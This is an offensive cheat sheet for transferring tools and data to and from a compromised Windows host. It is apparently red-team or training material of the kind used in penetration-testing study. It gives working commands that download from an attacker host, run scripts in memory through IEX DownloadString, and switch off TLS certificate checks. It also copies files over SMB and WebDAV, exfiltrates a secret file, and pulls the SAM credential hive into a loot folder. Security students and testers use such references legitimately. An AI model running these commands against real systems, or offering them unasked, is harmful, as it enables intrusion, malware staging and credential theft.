# File Transfer (Windows)
**Context:** You have compromised a Windows host (e.g., via RCE or valid credentials). You need to bring in tools (`mimikatz`, `winpeas`, `nc.exe`). 
**Key Insight:** PowerShell is the gold standard, but if monitored, native protocols like SMB and WebDAV can bypass network restrictions.
## 1. PowerShell Downloads (The Standard)
**Method:** Built-in cmdlets. Most common, but also most logged (Script Block Logging).
### Invoke-WebRequest (iwr)
**Syntax:** `iwr <URL> -OutFile <NAME>`
```powershell
# Standard Download
Invoke-WebRequest http://<ATTACKER_IP>/file.exe -OutFile file.exe

# Compatibility Mode (Fixes "Internet Explorer Engine is not available")
# -UseBasicParsing: Does not require IE DOM parsing (Faster & Safer)
Invoke-WebRequest http://<ATTACKER_IP>/file.exe -UseBasicParsing -OutFile file.exe
```
### System.Net.WebClient (Fast & Flexible)
**Method:** Uses .NET classes directly. Often faster than `iwr`.
```powershell
# Download to Disk
(New-Object Net.WebClient).DownloadFile('http://<ATTACKER_IP>/file.exe', 'C:\Windows\Temp\file.exe')

# Fileless Execution (Memory Only)
# Downloads script string and executes immediately (IEX)
IEX (New-Object Net.WebClient).DownloadString('http://<ATTACKER_IP>/script.ps1')
```
### Critical Fix: SSL/TLS Errors
**Context:** If the target is old or your cert is self-signed, the download will fail. Run this **before** the download command to disable SSL checks.
```powershell
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
```
## 2. SMB Transfers
**Method:** Windows Native File Sharing. 
**Pros:** No external tools needed. 
**Cons:** Port 445 (SMB) is often blocked inbound at the firewall.

```powershell
# Standard Copy (Unauthenticated/Guest)
copy \\<ATTACKER_IP>\share\file.exe C:\Windows\Temp\file.exe

# Authenticated Mount (If Guest access is disabled)
# 1. Mount the drive as Z:
net use Z: \\<ATTACKER_IP>\share /user:test test

# 2. Copy file
copy Z:\file.exe C:\Windows\Temp\file.exe
```
## 3. WebDAV Transfers (Firewall Bypass)
**Method:** Windows treats WebDAV (HTTP) like a network drive. 
**Key Insight:** If SMB (445) is blocked, WebDAV (80) often works because it looks like web traffic.
```powershell
# Syntax: \\<IP>\DavWWWRoot\file
copy \\<ATTACKER_IP>\DavWWWRoot\file.exe C:\Windows\Temp\file.exe

# Upload (Exfiltration)
copy C:\local\secret.txt \\<ATTACKER_IP>\DavWWWRoot\
```
## 4. RDP Drive Sharing
**Method:** Mapping your local Linux folder to the remote Windows RDP session. 
**Pros:** completely bypasses network firewalls (traffic is tunneled inside RDP).
### Linux Setup (Attacker)
```shell
# rdesktop (Legacy)
rdesktop <IP> -u user -p pass -r disk:sharename='/home/kali/tools'

# xfreerdp (Modern)
# /drive:<Name>,<Local_Path>
xfreerdp /v:<IP> /u:user /p:pass /drive:tools,/home/kali/tools
```
### Windows Access (Victim)
1. Open **File Explorer**.
2. Navigate to `This PC`.
3. Look for **tsclient** (Terminal Server Client).
4. Path: `\\tsclient\tools\file.exe`
## 5. PowerShell Remoting (WinRM)
**Method:** Using established PSSessions to push/pull files. 
**Prerequisite:** You must have valid credentials and WinRM enabled.
```powershell
# 1. Create Session
$Session = New-PSSession -ComputerName <TARGET_IP>

# 2. Upload (Local -> Remote)
Copy-Item -Path C:\local\mimikatz.exe -ToSession $Session -Destination C:\Windows\Temp\

# 3. Download (Remote -> Local)
Copy-Item -Path "C:\Windows\Temp\SAM.hive" -Destination C:\loot\ -FromSession $Session
```
## 6. Legacy FTP (Non-Interactive)
**Method:** Using the built-in Windows `ftp.exe` with a script file. Useful on very old systems (XP/2003) where PowerShell is missing.
```powershell
# 1. Create the command script
echo open <ATTACKER_IP> > ftp.txt
echo USER anonymous >> ftp.txt
echo binary >> ftp.txt
echo GET file.exe >> ftp.txt
echo bye >> ftp.txt

# 2. Execute FTP using the script (-s)
ftp -v -n -s:ftp.txt
```